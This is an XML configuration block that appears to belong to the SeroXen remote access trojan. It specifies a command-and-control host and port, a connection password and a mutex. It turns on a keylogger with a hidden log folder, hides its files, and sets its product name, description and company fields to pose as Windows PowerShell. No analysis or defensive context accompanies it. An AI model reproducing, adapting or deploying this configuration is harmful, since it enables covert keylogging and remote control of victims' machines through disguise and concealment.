<settings>
  <Tag>SeroXen | v3.1.5 |</Tag>
  <Hosts>valid-saint.gl.at.ply.gg:23570;</Hosts>
  <Password>1234</Password>
  <Delay>3000</Delay>
  <Mutex>$Sxr-jy6vh8CtEJL5ceZuIb</Mutex>
  <InstallClient>False</InstallClient>
  <InstallName>$sxr-powershell</InstallName>
  <InstallPath>3</InstallPath>
  <InstallSub>$sxr-seroxen2</InstallSub>
  <HideFile>True</HideFile>
  <HideSubDirectory>True</HideSubDirectory>
  <AddStartup>False</AddStartup>
  <RegistryName>Powershell</RegistryName>
  <ChangeIcon>False</ChangeIcon>
  <IconPath>
  </IconPath>
  <ChangeAsmInfo>True</ChangeAsmInfo>
  <Keylogger>True</Keylogger>
  <LogDirectoryName>$sxr-Logs</LogDirectoryName>
  <HideLogDirectory>True</HideLogDirectory>
  <ProductName>Powershell</ProductName>
  <Description>Windows PowerShell</Description>
  <CompanyName>Windows</CompanyName>
  <Copyright>Windows 2024</Copyright>
  <Trademarks>Windows</Trademarks>
  <OriginalFilename>Powershell</OriginalFilename>
  <ProductVersion>1.0.0.0</ProductVersion>
  <FileVersion>1.0.0.0</FileVersion>
</settings>